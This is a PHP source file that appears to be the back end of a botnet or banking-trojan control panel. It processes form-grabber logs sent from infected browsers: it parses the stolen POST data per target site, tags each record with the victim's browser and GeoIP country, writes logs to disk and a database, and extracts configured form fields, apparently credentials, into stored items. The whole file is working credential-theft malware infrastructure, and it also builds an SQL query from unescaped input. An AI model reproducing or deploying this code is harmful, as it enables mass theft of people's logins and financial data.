<?php

//ini_set('memory_limit', '8192M');

$var = array();

$r->data = rtrim($r->data, "[~]\r\n\r\n");
$var[0] = explode("[,]\r\n", $r->data);
unset($r->data);

if(count($var[0]) == 5){
	if(strlen($var[0][4]) <= 10240){
		$var[0][4] = explode('|POST:', $var[0][4], 2);

		if(!empty($var[0][4][0]) && !empty($var[0][4][1])){
			if(stripos($var[0][4][0], 'http://') === 0){
				$var[0]['host'] = get_host($var[0][4][0]);
				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', $var[0][4][0]), PHP_URL_PORT);
			}elseif(stripos($var[0][4][0], 'https://') === 0){
				$var[0]['host'] = get_host($var[0][4][0]);
				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', $var[0][4][0]), PHP_URL_PORT);
			}elseif(stripos($var[0][4][0], 'site://') === 0){
				$var[0][4][0] = str_replace('site://', 'http://', $var[0][4][0]);
				$var[0]['host'] = get_host($var[0][4][0]);
				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', $var[0][4][0]), PHP_URL_PORT);
			}else{
				$var[0]['host'] = get_host($var[0][4][0]);
				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', 'http://' . $var[0][4][0]), PHP_URL_PORT);
			}

			if(empty($var[0]['host'])) continue;

			if($var[0][3] == '1'){
				$var[0]['b'] = 'InternetExplorer';
			}elseif($var[0][3] == '2'){
				$var[0]['b'] = 'MozillaFirefox';
			}elseif($var[0][3] == '3'){
				$var[0]['b'] = 'Opera';
			}else{
				$var[0]['b'] = 'Unknow';
			}

			if($geoip_ex != true){
				$var[0]['country'] = geoip_country_code_by_name($var[0][2]);
			}else{
				if(file_exists($dir['site'] . '/cache/geoip/')) $var[0]['country'] = geoip_country_code_by_addr($gi, $var[0][2]);
			}
			if(empty($var[0]['country'])) $var[0]['country'] = 'UNK';

			if(isset($filters[$var[0]['host']]) && $filters[$var[0]['host']]['save_log'] == '1'){
				$var[0]['host_md5'] = md5($var[0]['host']);
				$mysqli->query('INSERT DELAYED INTO bf_save_ilog (host, md5, type) VALUES (\''.$var[0]['host'].'\', \''.$var[0]['host_md5'].'\', \''.$thread->type.'\')');
				file_put_contents($dir['s']['5'] . '/' . $var[0]['host_md5'], $var[0][0] . "[,]\r\n" . $var[0][1] . "[,]\r\n" . $var[0][2] . "[,]\r\n" . $var[0][3] . "[,]\r\n" . $var[0][4][0] . '|POST:' . $var[0][4][1] .  "[~]\r\n\r\n", FILE_APPEND);
			}

			if(isset($filters[$var[0]['host']]) && !empty($filters[$var[0]['host']]['fields']['formgrabber'][1]) && !file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_' . $filters[$var[0]['host']]['id'])){
				$var[1] = count($filters[$var[0]['host']]['fields']['name']);
				if($var[1] > 0){
					@mb_parse_str($var[0][4][1], $output);
					$output = array_change_key_case_unicode($output, CASE_LOWER);
					for($i = 1; $i <= $var[1]; $i++){
						if(!empty($filters[$var[0]['host']]['fields']['formgrabber'][$i])){							
							$var[2] = explode('|', $filters[$var[0]['host']]['fields']['formgrabber'][$i]);
							if(count($var[2]) > 0){
								foreach($var[2] as $data){
									if(!empty($data)){
										if(strpos($data, ',') != false){
											$var['3a'] = explode(',', $data);
											if(count($var['3a']) > 0){
												foreach($var['3a'] as $data_a){
													$data_a = mb_strtolower($data_a, 'UTF-8');
													if(strpos($data_a, '^') === 0){
														$data_a = str_replace('^', '', $data_a);
														foreach($output as $ke => $ou){
															if(stripos($ke, $data_a) === 0) $add_sql[$i] .= $ou;
														}
													}else{
														if(isset($output[$data_a])){
															$add_sql[$i] .= $output[$data_a];
														}elseif(stripos($data_a, 'TEXT:') === 0 && !empty($add_sql[$i])){
															$add_sql[$i] .= str_ireplace('TEXT:', '', $data_a);
														}
													}
												}
											}
										}else{
											$data_a = mb_strtolower($data, 'UTF-8');
											if(strpos($data_a, '^') === 0){
												$data_a = str_replace('^', '', $data_a);
												foreach($output as $ke => $ou){
													if(stripos($ke, $data_a) === 0){
														$add_sql[$i] .= $ou;
														break 1;
													}
												}
											}else{
												if(isset($output[$data_a])){
													$add_sql[$i] .= $output[$data_a];
												}elseif(stripos($data_a, 'TEXT:') === 0 && !empty($add_sql[$i])){
													$add_sql[$i] .= str_ireplace('TEXT:', '', $data_a);
												}
											}
										}
									}
								}
							}else{
								$add_sql = array();
								break 1;
							}
						}
					}
					
					if(count($add_sql) == $var[1]){
						add_item_new($filters[$var[0]['host']]['id'], array($var[0][0], $var[0][1], $var[0]['country'], $var[0]['b']), $add_sql);
					}
					
				}
			}
		}
	}
	unset($var);
}

?>